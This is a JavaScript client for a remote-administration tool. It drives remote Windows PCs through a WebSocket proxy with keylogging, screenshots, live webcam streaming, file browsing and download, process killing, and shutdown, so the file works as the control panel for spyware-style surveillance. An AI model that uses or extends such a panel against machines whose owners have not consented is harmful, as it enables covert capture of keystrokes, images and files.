// --- BIẾN TOÀN CỤC ---
let currentWindow = 0;
let ws = null;
let currentAction = ''; 
let isInSubMenu = false;
let isKeylogHooked = false;
let isWebcamActive = false;

// Biến Parse Dữ liệu
let parsingMode = null; 
let expectedItems = 0;
let currentItemsReceived = 0;
let tempRowData = []; 
let tempInfoHtml = "";

// File Manager Variables
let currentFilePath = "";
let pendingFileDownload = null;
let availableDrives = [];
let downloadingToast = null;

// Connection timeout
let connectionTimer = null;

// --- WEBSOCKET ---
function initWebSocket() {
    ws = new WebSocket("ws://localhost:8080");

    ws.onopen = () => {
        console.log("Connected to Proxy");
        ws.send("GET_SERVERS|"); 
        showToast("Backend Ready", "success");
    };

    ws.onmessage = (event) => {
        try {
            const msg = JSON.parse(event.data);
            handleServerMessage(msg);
        } catch (e) {
            console.log("Raw Data:", event.data);
        }
    };

    ws.onclose = () => {
        showToast("Connection Lost", "error");
        disconnectUI();
    };
}

function handleServerMessage(msg) {
    console.log("[WS] Received message type:", msg.type, "data length:", msg.data ? msg.data.length : 0);
    
    if (msg.type === "DISCOVERY") {
        const select = document.getElementById('serverSelect');
        let exists = false;
        for (let i = 0; i < select.options.length; i++) {
            if (select.options[i].value === msg.ip) exists = true;
        }
        if (!exists) {
            const option = document.createElement("option");
            option.text = msg.ip;
            option.value = msg.ip;
            select.add(option);
            // Don't auto-select, just remove the placeholder if this is first server
            if (select.options.length === 2 && select.options[0].disabled) {
                // Keep placeholder but don't remove it
            }
        }
    } 
    else if (msg.type === "STATUS") {
        // Clear connection timeout when status received
        if (connectionTimer) {
            clearTimeout(connectionTimer);
            connectionTimer = null;
        }
        
        if (msg.connected) {
            document.getElementById('homePage').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('mainContainer').classList.add('active');
                updateStatus(true);
                showToast("Connected to Server", "success");
                isInSubMenu = false;
            }, 500);
        } else {
            disconnectUI();
        }
    } 
    else if (msg.type === "ERROR") {
        // Clear connection timeout on error
        if (connectionTimer) {
            clearTimeout(connectionTimer);
            connectionTimer = null;
        }
        showToast(msg.msg, "error");
        // Send DISCONNECT immediately when connection fails
        ws.send('DISCONNECT|');
    }
    else if (msg.type === "CHAT") {
        const data = msg.data;
        addChatBubble(data, 'server');
        return;
    }
    else if (msg.type === "LOG") {
        const data = msg.data;
        console.log("[LOG] Data received, length:", data.length, "pendingFileDownload:", pendingFileDownload);
        if (data.includes("successfully") || data.includes("Error:") || data.includes("Unable to")) {
            const isError = data.toLowerCase().includes("error") || data.includes("Unable");
            showToast(data.trim(), isError ? "error" : "success");
            if (parsingMode === 'APP' || parsingMode === 'PROCESS') {
                let delayTime = 300;
                if (currentAction && currentAction.toLowerCase().includes('start')) delayTime = 1500;
                setTimeout(() => refreshListAfterAction(), delayTime);
            }
            return;
        }
        if (currentWindow === 3) {
            if (data.length < 100 && !isNaN(data)) {
                console.log("Incoming image size: " + data);
                return;
            }
            if (data.length > 100) {
                const display = document.getElementById('screenshotDisplay');
                display.innerHTML = `<img src="data:image/png;base64,${data}" alt="Screenshot" style="max-width:100%; border-radius:10px;">`;
                display.classList.add('show');
                document.getElementById('screenshotActions').style.display = 'flex';
                showToast("Screenshot captured", "success");
            }
            return;
        }
        if (currentWindow === 4) {
             if (data.length > 100) {
                const videoImg = document.getElementById('webcamTarget'); // Ta sẽ dùng thẻ img thay vì video để render MJPEG
                if(videoImg) videoImg.src = `data:image/jpeg;base64,${data}`;
             }
             return;
        }
        if (parsingMode === 'KEYLOG') {
            const keylogOut = document.getElementById('keylogOutput');
            let formatted = data.replace(/\n/g, "<br>");
            keylogOut.innerHTML += formatted + "<br>"; 
            keylogOut.scrollTop = keylogOut.scrollHeight;
            return;
        }
        if (pendingFileDownload && data.length > 10) {
            console.log("[DOWNLOAD] Received Base64 data, length:", data.length);
            console.log("[DOWNLOAD] First 50 chars:", data.substring(0, 50));
            handleFileDownload(data);
            return;
        }
        if (parsingMode === 'DRIVES') {
            if (data.trim() === 'DRIVELIST') {
                document.getElementById('fileList').innerHTML = '';
                availableDrives = [];
                return;
            }
            if (data.length === 2 && data.endsWith(':')) {
                availableDrives.push(data);
                renderDriveItem(data);
            }
            return;
        }
        if (parsingMode === 'FILE') {
            if (data.trim() === 'FILELIST') {
                document.getElementById('fileList').innerHTML = '';
                return;
            }
            const parts = data.split('|');
            if (parts.length === 3) {
                const type = parts[0];
                const name = parts[1];
                const size = parts[2];
                renderFileItem(type, name, size);
            }
            return;
        }
        if (parsingMode === 'PROCESS' || parsingMode === 'APP') {
            if (expectedItems === 0) {
                if (!isNaN(data.trim()) && parseInt(data.trim()) > 0) {
                    expectedItems = parseInt(data.trim());
                    currentItemsReceived = 0;
                    tempRowData = [];
                    const listId = parsingMode === 'PROCESS' ? 'processList' : 'appList';
                    document.getElementById(listId).innerHTML = ''; 
                    console.log(`Receiving ${expectedItems} items...`);
                } else if (data.trim() === "0") {
                    const listId = parsingMode === 'PROCESS' ? 'processList' : 'appList';
                    document.getElementById(listId).innerHTML = '<div class="loading-text">No items found.</div>';
                }
            } else {
                tempRowData.push(data.trim());
                const linesPerItem = parsingMode === 'PROCESS' ? 3 : 4;
                
                if (tempRowData.length === linesPerItem) {
                    renderListItem(tempRowData); 
                    tempRowData = []; 
                    currentItemsReceived++;
                    
                    if (currentItemsReceived >= expectedItems) {
                        expectedItems = 0;
                        showToast("List updated", "success");
                    }
                }
            }
        }
        if (parsingMode === 'INFO') {
            const data = msg.data;
            
            if (data === "END_INFO") {
                document.getElementById('systemInfoGrid').innerHTML = tempInfoHtml;
                parsingMode = null;
                showToast("System Info Updated", "success");
            } 
            else if (data.startsWith("KEY:")) {
                const parts = data.substring(4).split('|');
                if (parts.length >= 2) {
                    const label = parts[0];
                    const value = parts[1];
                    let icon = '💻';
                    if (label.includes('CPU')) icon = '⚙️';
                    if (label.includes('RAM')) icon = '💾';
                    if (label.includes('Disk')) icon = '💿';
                    if (label.includes('User')) icon = '👤';
                    if (label.includes('OS')) icon = '🪟';

                    tempInfoHtml += `
                        <div class="info-card">
                            <div class="info-icon">${icon}</div>
                            <div class="info-label">${label}</div>
                            <div class="info-value">${value}</div>
                        </div>
                    `;
                }
            }
            return; 
        }
    }
}

function renderListItem(data) {
    if (parsingMode === 'PROCESS') {
        const html = `
            <div class="data-row">
                <div class="col-main">
                    <div class="row-icon">⚙️</div>
                    <div class="row-info">
                        <span class="row-name" title="${data[0]}">${data[0]}</span>
                        <span class="row-sub">PID: ${data[1]}</span>
                    </div>
                </div>
                <div class="col-detail"><span class="badge">${data[2]} Threads</span></div>
            </div>`;
        document.getElementById('processList').insertAdjacentHTML('beforeend', html);
    } else {
        const html = `
            <div class="data-row">
                <div class="col-main">
                    <div class="row-icon">🖥️</div>
                    <div class="row-info">
                        <span class="row-name" title="${data[0]}">${data[0]}</span>
                        <span class="row-sub">${data[1]}</span>
                    </div>
                </div>
                <div class="col-detail"><span class="badge">PID: ${data[2]}</span></div>
            </div>`;
        document.getElementById('appList').insertAdjacentHTML('beforeend', html);
    }
}

function refreshListAfterAction() {
    if (parsingMode === 'APP') showAppList(); 
    else showProcessList();
}

function showProcessList() {
    document.getElementById('processList').style.display = 'block';
    document.getElementById('processList').innerHTML = '<div class="loading-text">⟳ Fetching processes...</div>';
    parsingMode = 'PROCESS';
    expectedItems = 0;
    currentItemsReceived = 0;
    if (!isInSubMenu) {
        ws.send("CMD|PROCESS");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|XEM"), 300);
    } else {
        ws.send("CMD|QUIT");
        
        setTimeout(() => {
            ws.send("CMD|PROCESS");
            isInSubMenu = true;

            setTimeout(() => {
                ws.send("CMD|XEM");
            }, 300);
        }, 300);
    }
}

function showAppList() {
    document.getElementById('appList').style.display = 'block';
    document.getElementById('appList').innerHTML = '<div class="loading-text">⟳ Fetching applications...</div>';
    parsingMode = 'APP';
    expectedItems = 0;
    currentItemsReceived = 0;
    if (!isInSubMenu) {
        ws.send("CMD|APPLICATION");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|XEM"), 300);
    } else {
        ws.send("CMD|QUIT");
        setTimeout(() => {
            ws.send("CMD|APPLICATION");
            isInSubMenu = true;
            setTimeout(() => ws.send("CMD|XEM"), 300);
        }, 300);
    }
}

function showInput(action) {
    if (action.includes('App')) parsingMode = 'APP';
    else parsingMode = 'PROCESS';
    if (!isInSubMenu) {
        if (parsingMode === 'APP') ws.send("CMD|APPLICATION");
        else ws.send("CMD|PROCESS");
        isInSubMenu = true;
    }
    
    currentAction = action;
    const modal = document.getElementById('inputModal');
    const input = document.getElementById('modalInput');
    
    input.value = '';
    modal.classList.add('active');
    
    if (action.includes('kill')) {
        document.getElementById('modalTitle').textContent = 'Terminate';
        input.placeholder = 'Enter PID (e.g. 1234)';
    } else {
        document.getElementById('modalTitle').textContent = 'Start';
        input.placeholder = 'Enter Name (e.g. notepad)';
    }
    input.focus();
}

function closeModal() { document.getElementById('inputModal').classList.remove('active'); }

function submitInput() {
    closeModal();
    const value = document.getElementById('modalInput').value.trim();
    if (!value) return;
    if (currentAction.includes('kill')) {
        ws.send("CMD|KILL");
        setTimeout(() => ws.send("CMD|KILLID"), 50);
        setTimeout(() => ws.send(`CMD|${value}`), 100);
    } 
    else if (currentAction.includes('start')) {
        ws.send("CMD|START");
        setTimeout(() => ws.send("CMD|STARTID"), 50);
        setTimeout(() => ws.send(`CMD|${value}`), 100);
    }

    showToast('Processing...', 'info');
}

// --- CORE FUNCTIONS ---
function connect() {
    const manualIP = document.getElementById('manualIP').value.trim();
    const selectedIP = document.getElementById('serverSelect').value;
    
    let ip = manualIP || selectedIP;
    
    if (!ip) {
        return showToast('Please select a server or enter an IP address', 'warning');
    }
    
    // Simple IP validation
    const ipPattern = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
    if (!ipPattern.test(ip)) {
        return showToast('Invalid IP address format', 'error');
    }
    
    // Clear existing timeout if any
    if (connectionTimer) {
        clearTimeout(connectionTimer);
        connectionTimer = null;
    }
    
    // Send disconnect first to ensure clean state
    ws.send('DISCONNECT|');
    
    // Wait a bit for disconnect to complete, then connect
    setTimeout(() => {
        // Set 2.2 second timeout (slightly longer than server timeout of 2s)
        connectionTimer = setTimeout(() => {
            showToast('Connection timeout. Server not responding.', 'error');
            ws.send('DISCONNECT|');
            connectionTimer = null;
        }, 2200);
        
        ws.send(`CONNECT|${ip}`);
        showToast('Connecting to ' + ip + '...', 'info');
    }, 150);
}

function disconnect() {
    // Clear connection timeout if exists
    if (connectionTimer) {
        clearTimeout(connectionTimer);
        connectionTimer = null;
    }
    
    if(isInSubMenu) ws.send("CMD|QUIT"); 
    isInSubMenu = false;
    setTimeout(() => ws.send("DISCONNECT|"), 200);
}

function disconnectUI() {
    updateStatus(false);
    document.getElementById('mainContainer').classList.remove('active');
    document.getElementById('homePage').classList.remove('hidden');
    currentWindow = 0;
    isInSubMenu = false;
    parsingMode = null;
    document.getElementById('windowsWrapper').style.transform = `translateX(0)`;
}

function updateStatus(connected) {
    const box = document.getElementById('statusBox');
    const text = document.getElementById('statusText');
    box.className = connected ? 'status-box connected' : 'status-box disconnected';
    text.textContent = connected ? 'Connected' : 'Disconnected';
    if(connected) text.classList.add('success'); else text.classList.remove('success');
}

function navigateTo(index) {
    if (currentWindow === index) return;
    if (currentWindow === 2 || currentWindow === 4 || currentWindow === 5 || isInSubMenu) {
        if (currentWindow === 2 && isKeylogHooked) {
            ws.send("CMD|UNHOOK");
            isKeylogHooked = false;
        }
        if (currentWindow === 4 && isWebcamActive) {
            ws.send("CMD|STOP");
            isWebcamActive = false;
            document.getElementById('liveIndicator').classList.remove('active');
        }
        ws.send("CMD|QUIT");
        isInSubMenu = false;
    }
    parsingMode = null;
    performUITransition(index); 
    if (index === 2) {
        ws.send("CMD|KEYLOG");
        isInSubMenu = true;
        console.log("Entered Keylog Menu");
    } 
    else if (index === 4) {
        ws.send("CMD|WEBCAM");
        isInSubMenu = true;
        console.log("Entered Webcam Menu");
    }
    else if (index === 5) {
        ws.send("CMD|CHAT");
        isInSubMenu = true;
        setTimeout(() => startChatSession(), 300);
    }
    else if (index === 6) {
        console.log("Entered File Manager");
    }
    else if (index === 7) {
        fetchSystemInfo();
    }
}
function enterNewTab(index) {
    if (index == 5) {
        setTimeout(() => startChatSession(), 50);
    }
    if (index == 7) {
        fetchSystemInfo();
    }
    performUITransition(index);
}
function performUITransition(index) {
    currentWindow = index;
    const wrapper = document.getElementById('windowsWrapper');
    wrapper.style.transform = `translateX(-${index * 100}vw)`;
    const buttons = document.querySelectorAll('.nav-btn');
    const btn = buttons[index];
    const indicator = document.getElementById('navIndicator');
    if(btn) {
        indicator.style.width = btn.offsetWidth + 'px';
        indicator.style.left = btn.offsetLeft + 'px';
    }
}
function hookKeylog() {
    if (isKeylogHooked) return showToast('Keylog is already running', 'warning');
    ws.send("CMD|HOOK");
    isKeylogHooked = true;
    showToast('Keylog Hooked', 'success');
}

function unhookKeylog() {
    if (!isKeylogHooked) return showToast('Keylog is NOT running', 'error');
    ws.send("CMD|UNHOOK");
    isKeylogHooked = false;
    showToast('Keylog Unhooked', 'warning');
}

function printKeylog() {
    parsingMode = 'KEYLOG'; 
    const output = document.getElementById('keylogOutput');
    output.style.display = 'block';
    if (output.innerHTML.trim() !== "") {
        output.innerHTML += '<div class="log-separator">---------------- NEW SESSION ----------------</div>';
    }
    output.scrollTop = output.scrollHeight;
    ws.send("CMD|PRINT");
}

function deleteLogs() {
    if(!confirm("Clear Keylog history on screen?")) return;
    document.getElementById('keylogOutput').innerHTML = '';
    ws.send("CMD|DELETE");
    showToast('Screen history cleared', 'success');
}

function shutdownServer() {
    if(confirm("Shutdown remote PC?")) {
        if (isInSubMenu) ws.send("CMD|QUIT");
        setTimeout(() => ws.send("CMD|SHUTDOWN"), 300);
    }
}
function restartServer() { 
    if(confirm("Restart remote PC?")) {
        if (isInSubMenu) ws.send("CMD|QUIT");
        setTimeout(() => ws.send("CMD|RESTART"), 300);
    }
}
window.onload = () => {
    initWebSocket();
    document.getElementById('modalInput').value = '';
    const btn = document.querySelector('.nav-btn');
    if(btn) document.getElementById('navIndicator').style.width = btn.offsetWidth + 'px';
};
function handleModalEnterKey(e) { if(e.key==='Enter') submitInput(); }
function captureScreenshot() {
    ws.send("CMD|TAKEPIC");
    isInSubMenu = true;
    showToast("Capturing screen...", "info");
    setTimeout(() => {
        ws.send("CMD|TAKE");
    }, 300);
}

function saveScreenshot() {
    const img = document.querySelector('#screenshotDisplay img');
    if (img) {
        const fileName = prompt("Enter filename:", `screenshot_${new Date().getTime()}`);
        if (fileName) {
            const link = document.createElement('a');
            link.href = img.src;
            link.download = fileName.endsWith('.png') ? fileName : fileName + '.png';
            link.click();
            showToast("Screenshot saved", "success");
        }
    } else {
        showToast("No image to save", "warning");
    }
}

function deleteScreenshot() {
    document.getElementById('screenshotDisplay').innerHTML = '';
    document.getElementById('screenshotActions').style.display = 'none';
    showToast("Screenshot cleared", "info");
}
function startWebcam() {
    if (isWebcamActive) return showToast('Webcam is already streaming', 'warning');
    const container = document.getElementById('webcamVideo').parentNode;
    if (!document.getElementById('webcamTarget')) {
        const img = document.createElement('img');
        img.id = 'webcamTarget';
        img.style.width = '100%';
        img.style.borderRadius = '10px';
        container.appendChild(img);
        document.getElementById('webcamVideo').style.display = 'none';
    }
    ws.send("CMD|START");
    document.getElementById('liveIndicator').classList.add('active');
    isWebcamActive = true;
    showToast("Webcam started", "success");
}

function endWebcam() {
    if (!isWebcamActive) return showToast('Webcam is NOT running', 'error');
    ws.send("CMD|STOP");
    
    document.getElementById('liveIndicator').classList.remove('active');
    const target = document.getElementById('webcamTarget');
    if(target) target.src = "";
    
    isWebcamActive = false;
    showToast("Webcam stopped", "warning");
}

function fetchSystemInfo() {
    document.getElementById('systemInfoGrid').innerHTML = '<div class="loading-text">⟳ Scanning System...</div>';
    if (isInSubMenu) {
        ws.send("CMD|QUIT");
        isInSubMenu = false;
    }
    parsingMode = 'INFO';
    tempInfoHtml = "";
    setTimeout(() => {
        ws.send("CMD|INFO");
    }, 200);
}
function shutdownServer() {
    if(confirm("Are you sure you want to SHUTDOWN the remote PC?")) {
        if (isInSubMenu) {
            ws.send("CMD|QUIT");
            setTimeout(() => ws.send("CMD|SHUTDOWN"), 200);
        } else {
            ws.send("CMD|SHUTDOWN");
        }
        showToast("Shutdown command sent", "success");
    }
}

function restartServer() {
    if(confirm("Are you sure you want to RESTART the remote PC?")) {
         if (isInSubMenu) {
            ws.send("CMD|QUIT");
            setTimeout(() => ws.send("CMD|RESTART"), 200); 
        } else {
            ws.send("CMD|RESTART");
        }
        showToast("Restart command sent", "success");
    }
}
function showToast(message, type = 'info', persistent = false) {
    const container = document.getElementById('toastContainer');
    if (!container) return null;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    let icon = 'ℹ️';
    if (type === 'success') icon = '✓';
    else if (type === 'error') icon = '✕';
    else if (type === 'warning') icon = '⚠️';

    toast.innerHTML = `
        <div class="toast-icon">${icon}</div>
        <div class="toast-content">
            <div class="toast-message">${message}</div>
        </div>
    `;

    container.appendChild(toast);
    requestAnimationFrame(() => {
        toast.classList.add('show');
    });
    if (!persistent) {
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => {
                if (container.contains(toast)) container.removeChild(toast);
            }, 400);
        }, 3000);
    }
    
    return toast;
}

function hideToast(toast) {
    if (!toast) return;
    toast.classList.remove('show');
    setTimeout(() => {
        if (toast.parentNode) toast.parentNode.removeChild(toast);
    }, 400);
}
function startChatSession() {
    ws.send("CMD|CHAT");
    isInSubMenu = true;
    setTimeout(() => {
        ws.send("CMD|START");
        document.getElementById('chatMessages').innerHTML = '<div class="chat-bubble system">Connecting to chat service...</div>';
    }, 300);
}

function sendChatMessage() {
    const input = document.getElementById('chatInput');
    const text = input.value.trim();
    if (!text) return;
    ws.send(`CMD|MSG|${text}`); 
    addChatBubble(text, 'me');
    input.value = '';
}

function handleChatKey(e) { 
    if (e.key === 'Enter') sendChatMessage();
}

function addChatBubble(text, type) {
    const container = document.getElementById('chatMessages');
    const div = document.createElement('div');
    div.className = `chat-bubble ${type}`;
    div.textContent = text;
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
}
function browseFiles(path) {
    if (!path) path = currentFilePath;
    if (!path.endsWith("\\")) path += "\\";
    currentFilePath = path;
    document.getElementById('currentPath').value = path;
    const fileList = document.getElementById('fileList');
    fileList.innerHTML = '<div class="loading-text">⟳ Loading...</div>';
    if (!isInSubMenu) {
        ws.send("CMD|FILE");
        isInSubMenu = true;
        setTimeout(() => {
            ws.send("CMD|LIST");
            setTimeout(() => ws.send("CMD|" + path), 100);
        }, 200);
    } else {
        ws.send("CMD|QUIT");
        setTimeout(() => {
            ws.send("CMD|FILE");
            isInSubMenu = true;
            setTimeout(() => {
                ws.send("CMD|LIST");
                setTimeout(() => ws.send("CMD|" + path), 100);
            }, 200);
        }, 200);
    }
    parsingMode = 'FILE';
}

function listDrives() {
    const fileList = document.getElementById('fileList');
    fileList.innerHTML = '<div class="loading-text">⟳ Loading drives...</div>';
    if (!isInSubMenu) {
        ws.send("CMD|FILE");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|DRIVES"), 200);
    } else {
        ws.send("CMD|QUIT");
        setTimeout(() => {
            ws.send("CMD|FILE");
            isInSubMenu = true;
            setTimeout(() => ws.send("CMD|DRIVES"), 200);
        }, 200);
    }
    parsingMode = 'DRIVES';
    document.getElementById('currentPath').value = 'My Computer';
}

function navigateToPath() {
    const path = document.getElementById('currentPath').value.trim();
    if (!path) {
        showToast("Please enter a path", "warning");
        return;
    }
    browseFiles(path);
}

function navigateUp() {
    let path = currentFilePath;
    if (path.endsWith("\\")) path = path.slice(0, -1);
    const lastSlash = path.lastIndexOf("\\");
    if (lastSlash > 0) {
        path = path.substring(0, lastSlash);
        browseFiles(path);
    } else if (path.length > 2) {
        browseFiles(path.substring(0, 2));
    } else {
        listDrives();
    }
}

function renderFileItem(type, name, size) {
    const fileList = document.getElementById('fileList');
    const icon = type === 'DIR' ? '📁' : '📄';
    const sizeStr = type === 'DIR' ? '' : formatFileSize(parseInt(size));
    const escapedName = name.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;'); 
    const onclick = type === 'DIR' ? `openFolder('${escapedName}')` : `downloadFile('${escapedName}')`;
    const html = `
        <div class="file-row" onclick="${onclick}">
            <div class="file-icon">${icon}</div>
            <div class="file-info">
                <span class="file-name">${name}</span>
                ${sizeStr ? `<span class="file-size">${sizeStr}</span>` : ''}
            </div>
        </div>`;
    fileList.insertAdjacentHTML('beforeend', html);
}

function renderDriveItem(driveLetter) {
    const fileList = document.getElementById('fileList');
    const icon = '💾';
    const drivePath = driveLetter;
    const html = `
        <div class="file-row drive-row" onclick="browseFiles('${drivePath}')">
            <div class="file-icon">${icon}</div>
            <div class="file-info">
                <span class="file-name">Drive ${driveLetter}</span>
                <span class="file-size">Local Disk</span>
            </div>
        </div>`;
    fileList.insertAdjacentHTML('beforeend', html);
}

function openFolder(folderName) {
    let newPath = currentFilePath + folderName;
    browseFiles(newPath);
}

function downloadFile(fileName) {
    let filePath = currentFilePath + fileName;
    if (downloadingToast) hideToast(downloadingToast);
    downloadingToast = showToast("Downloading " + fileName + "...", "info", true);
    pendingFileDownload = fileName;
    if (!isInSubMenu) {
        ws.send("CMD|FILE");
        isInSubMenu = true;
        setTimeout(() => {
            ws.send("CMD|DOWNLOAD");
            setTimeout(() => ws.send("CMD|" + filePath), 100);
        }, 200);
    } else {
        ws.send("CMD|DOWNLOAD");
        setTimeout(() => ws.send("CMD|" + filePath), 100);
    }
}

function handleFileDownload(base64Data) {
    if (!pendingFileDownload) {
        console.error("[DOWNLOAD] No pending download!");
        return;
    }
    console.log("[DOWNLOAD] Starting download for:", pendingFileDownload);
    console.log("[DOWNLOAD] Base64 length:", base64Data.length);
    try {
        const binaryString = atob(base64Data);
        console.log("[DOWNLOAD] Decoded binary length:", binaryString.length);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        console.log("[DOWNLOAD] Created Uint8Array, size:", bytes.length);
        const blob = new Blob([bytes]);
        console.log("[DOWNLOAD] Created Blob, size:", blob.size);
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = pendingFileDownload;
        link.click();
        URL.revokeObjectURL(url);
        console.log("[DOWNLOAD] Download triggered successfully");
        if (downloadingToast) {
            hideToast(downloadingToast);
            downloadingToast = null;
        }
        showToast("Downloaded: " + pendingFileDownload, "success");
        pendingFileDownload = null;
    } catch (error) {
        console.error("[DOWNLOAD] Error:", error);
        if (downloadingToast) {
            hideToast(downloadingToast);
            downloadingToast = null;
        }
        showToast("Download failed: " + error.message, "error");
        pendingFileDownload = null;
    }
}

function formatFileSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}